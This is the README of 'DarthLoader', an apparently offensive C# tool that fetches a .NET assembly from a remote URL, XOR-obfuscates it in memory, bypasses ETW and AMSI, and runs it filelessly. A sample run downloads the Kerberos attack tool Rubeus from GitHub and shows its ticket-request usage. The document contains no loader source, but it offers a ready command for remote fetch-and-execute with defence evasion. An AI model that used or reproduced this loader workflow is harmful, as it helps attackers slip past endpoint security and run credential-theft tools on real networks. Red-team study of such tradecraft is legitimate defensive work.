# DarthLoader
This is a project heavily inspired by Jean-François Maes's [SANS  Workshop Reflection in C#](https://www.sans.org/webcasts/sans-workshop-reflection-in-c-/) to help (c)sharpen by C# dev skills. A lot of code was borrowed and/or extended for this project from:
- https://github.com/cobbr/SharpSploit/tree/master/SharpSploit/Evasion
- https://jfmaes-1.gitbook.io/reflection-workshop/
- StackOverflow

DarthLoader will do the following:
- Remotely fetch a .Net assembly from the web using a base64 encoded url and Xor the byte array in memory.
- Fetch a local .Net assembly into memory.
- Bypass ETW and AMSI by decrypting function strings at runtime via xor key being passed as cmdline arg.
- Decrypt and run the assembly from memory.

```
PS D:\SecToolDev\DarthLoader\DarthLoader\bin\x64\Release> .\DarthLoader.exe testing123 https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Rubeus.exe test

 _______                     __     __       __                              __
|       \                   |  \   |  \     |  \                            |  \
| $$$$$$$\ ______   ______ _| $$_  | $$____ | $$      ______   ______   ____| $$ ______   ______
| $$  | $$|      \ /      |   $$ \ | $$    \| $$     /      \ |      \ /      $$/      \ /      \
| $$  | $$ \$$$$$$|  $$$$$$\$$$$$$ | $$$$$$$| $$    |  $$$$$$\ \$$$$$$|  $$$$$$|  $$$$$$|  $$$$$$\
| $$  | $$/      $| $$   \$$| $$ __| $$  | $| $$    | $$  | $$/      $| $$  | $| $$    $| $$   \$$
| $$__/ $|  $$$$$$| $$      | $$|  | $$  | $| $$____| $$__/ $|  $$$$$$| $$__| $| $$$$$$$| $$
| $$    $$\$$    $| $$       \$$  $| $$  | $| $$     \$$    $$\$$    $$\$$    $$\$$     | $$
 \$$$$$$$  \$$$$$$$\$$        \$$$$ \$$   \$$\$$$$$$$$\$$$$$$  \$$$$$$$ \$$$$$$$ \$$$$$$$\$$


[!] ETW bypassed!
[!] Amsi bypassed!
[*] Downloading and encrypting assembly with the key: test
[+] Encrypted assembly loaded into memory...
[+] Hit any key to run...

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


 Ticket requests and renewals:

    Retrieve a TGT based on a user password/hash, optionally saving to a file or applying to the current logon session or a specific LUID:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec]

    Retrieve a TGT based on a user password/hash, start a /netonly process, and to apply the ticket to the new process/logon session:
        Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\Windows\System32\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec]


<-----SNIP----->
```

## To-do
- [X] Paramerize URL 
- [ ] Paramerize assembly parameters
- [ ] remote fetch congfig? (remote fetch assembly URL, Xor key etc.)
- [ ] Help menu
